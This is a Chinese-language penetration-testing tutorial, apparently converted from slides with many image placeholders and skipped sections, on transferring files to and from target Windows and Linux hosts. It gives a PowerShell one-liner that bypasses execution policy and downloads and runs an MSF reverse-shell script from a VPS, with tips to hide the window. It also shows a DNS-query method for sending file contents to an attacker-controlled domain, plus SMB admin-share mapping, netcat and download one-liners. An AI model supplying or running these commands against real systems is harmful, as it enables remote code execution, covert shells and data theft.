以下是几种常用的Windows命令行文件传输方法：

1.  **利用 `certutil` 下载文件**：`certutil` 是Windows自带的证书工具，也可用于下载文件。
2.  **利用 `bitsadmin` 下载文件**：后台智能传输服务（BITS）的命令行工具，可用于创建下载或上传任务。
3.  **利用 `PowerShell` 进行文件传输**：功能强大的脚本环境，提供了多种文件下载和执行的方法。

### 方法一：创建WebClient对象下载

![](img/15669ec978c11da796f888b00bd6d6a9_72.png)

![](img/15669ec978c11da796f888b00bd6d6a9_74.png)

以下是利用PowerShell下载文件的一种方法，分为两部分以便理解：

![](img/15669ec978c11da796f888b00bd6d6a9_76.png)

![](img/15669ec978c11da796f888b00bd6d6a9_77.png)

![](img/15669ec978c11da796f888b00bd6d6a9_81.png)

![](img/15669ec978c11da796f888b00bd6d6a9_83.png)

```powershell
$p = New-Object System.Net.WebClient
$p.DownloadFile("http://目标URL/文件", "本地保存路径\文件名")
```

![](img/15669ec978c11da796f888b00bd6d6a9_85.png)

![](img/15669ec978c11da796f888b00bd6d6a9_86.png)

![](img/15669ec978c11da796f888b00bd6d6a9_87.png)

*   **第一部分**：`New-Object System.Net.WebClient` 创建了一个 `WebClient` 对象，并赋值给变量 `$p`。`System.Net.WebClient` 对象提供了用于发送和接收由URI标识的资源数据的方法。
*   **第二部分**：调用该对象的 `DownloadFile` 方法。该方法从指定的URL下载资源，并保存到本地指定路径。

![](img/15669ec978c11da796f888b00bd6d6a9_93.png)

![](img/15669ec978c11da796f888b00bd6d6a9_95.png)

### 方法五：加载远程PowerShell脚本并执行

![](img/15669ec978c11da796f888b00bd6d6a9_194.png)

![](img/15669ec978c11da796f888b00bd6d6a9_196.png)

![](img/15669ec978c11da796f888b00bd6d6a9_198.png)

![](img/15669ec978c11da796f888b00bd6d6a9_200.png)

![](img/15669ec978c11da796f888b00bd6d6a9_201.png)

![](img/15669ec978c11da796f888b00bd6d6a9_202.png)

我们可以直接加载并执行远程服务器上的PowerShell脚本，例如用于反弹Shell的脚本。

假设通过MSF生成了一个PowerShell反弹脚本 `shell.ps1` 并托管在VPS上。

1.  在MSF上设置监听器。
2.  在目标机器上执行以下命令：

```powershell
powershell -exec bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://your-vps-ip/shell.ps1')"
```

*   `-exec bypass` 或 `-ep bypass`：设置执行策略为 `Bypass`，绕过系统默认的脚本执行限制。
*   `IEX` 或 `Invoke-Expression`：将字符串作为命令执行。
*   `DownloadString`：将远程脚本内容下载到内存中执行，无文件落地。

![](img/15669ec978c11da796f888b00bd6d6a9_204.png)

![](img/15669ec978c11da796f888b00bd6d6a9_206.png)

为了更隐蔽，可以添加 `-WindowStyle Hidden`（或 `-W Hidden`）参数来隐藏弹出的命令行窗口，以及 `-NoProfile`（`-NoP`）参数不加载用户配置文件。

*   **SCP命令**：在Windows中也可用，用于在本地和远程主机（通常是Linux）间安全复制文件。
    *   上传：`scp 本地文件 用户名@远程IP:远程路径`
    *   下载：`scp 用户名@远程IP:远程文件 本地路径`
*   **Windows文件共享 (Net Use)**：通过SMB协议映射网络驱动器。
    ```cmd
    net use K: \\目标IP\C$ "密码" /user:"用户名"
    ```
    映射后，即可像访问本地磁盘一样访问远程文件，进行复制等操作。此方法通常需要目标主机的凭据。

以下是几种常用的Linux命令行文件传输方法：

![](img/15669ec978c11da796f888b00bd6d6a9_244.png)

![](img/15669ec978c11da796f888b00bd6d6a9_246.png)

![](img/15669ec978c11da796f888b00bd6d6a9_248.png)

1.  **wget命令**：强大的下载工具。
    ```bash
    wget http://目标URL/文件 -O 保存文件名
    ```
2.  **curl命令**：功能丰富的网络数据传输工具。
    ```bash
    curl -o 保存文件名 http://目标URL/文件
    ```
3.  **nc (netcat) 命令**：网络工具中的“瑞士军刀”，可用于文件传输。
    *   **接收端（监听）**：`nc -lvp 端口号 > 接收文件名`
    *   **发送端**：`cat 发送文件名 | nc 接收端IP 端口号`
4.  **sftp命令**：基于SSH的安全文件传输。
    ```bash
    sftp 用户名@远程IP
    # 连接后使用 put（上传）、get（下载）等命令
    ```
5.  **通过DNS传输数据（技巧）**：一种隐蔽的数据外带方法。
    ```bash
    cat 要传输的文件 | xxd -c 16 -p | while read line; do dig $line.your-dns-log-domain.com; done
    ```
    此命令将文件内容转为十六进制，并通过DNS查询请求将数据发送到可控的DNS日志平台，从而带出数据。

## 利用脚本语言进行文件传输 📜

当目标系统没有上述常用命令时，可以尝试利用已存在的脚本语言环境。

![](img/15669ec978c11da796f888b00bd6d6a9_252.png)

![](img/15669ec978c11da796f888b00bd6d6a9_254.png)

![](img/15669ec978c11da796f888b00bd6d6a9_256.png)

以下是几种脚本语言的示例：

1.  **PHP**
    ```php
    <?php file_put_contents('本地文件', file_get_contents('http://目标URL/远程文件')); ?>
    ```
    使用 `php -r` 参数可直接执行代码片段：
    ```bash
    php -r "file_put_contents('local.txt', file_get_contents('http://url/file'));"
    ```
2.  **Python**
    *   Python2:
        ```python
        python -c "import urllib2; open('local.txt','wb').write(urllib2.urlopen('http://url/file').read())"
        ```
    *   Python3:
        ```python
        python3 -c "import urllib.request; urllib.request.urlretrieve('http://url/file', 'local.txt')"
        ```
3.  **Perl / Ruby**：原理类似，利用相应的网络库进行下载和保存。
